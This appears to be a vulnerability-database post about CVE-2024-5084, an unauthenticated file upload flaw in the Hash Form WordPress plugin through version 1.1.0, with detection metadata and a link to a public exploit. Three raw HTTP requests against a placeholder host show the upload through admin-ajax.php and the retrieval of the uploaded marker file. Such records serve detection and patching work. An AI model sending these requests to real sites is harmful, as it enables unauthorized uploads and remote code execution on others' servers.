---
layout: "post"
cve_id: "CVE-2024-5084"
title: "Hash Form <= 1.1.0 - Arbitrary File Upload"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-5084.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-5084.yaml"
author: "s4e-io"
severity: "critical"
remediation: "Fixed in 1.1.1"
reference:
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-5084"
  - "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/hash-form/hash-form-drag-drop-form-builder-110-unauthenticated-arbitrary-file-upload-to-remote-code-execution"
  - "https://github.com/WOOOOONG/CVE-2024-5084/blob/main/CVE-2024-5084_exploit.py"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2024-5084"
  epss-score: 0.92524
  epss-percentile: 0.99719
metadata:
  verified: True
  max-request: 1
  vendor: "HashThemes"
  product: "Hash Form"
  framework: "wordpress"
  publicwww-query: "/wp-content/plugins/hash-form/"
tags:
  - "cve"
  - "cve2024"
  - "wp-plugin"
  - "wordpress"
  - "file-upload"
  - "rce"
  - "intrusive"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
The Hash Form Drag & Drop Form Builder plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the 'file_upload_action' function in all versions up to, and including, 1.1.0. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.


## ðŸŒ HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php?action=hashform_file_upload_action&file_uploader_nonce=KZoVeM&allowedExtensions%5B0%5D=txt&sizeLimit=1048576&qqfile=ToMaewGk.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.2 Safari/537.36
Connection: close
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

c2937f3a1b3a177d2408574da0245a19
```

```nohighlight
GET /wp-content/uploads/hashform/temp/ToMaewGk.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
```


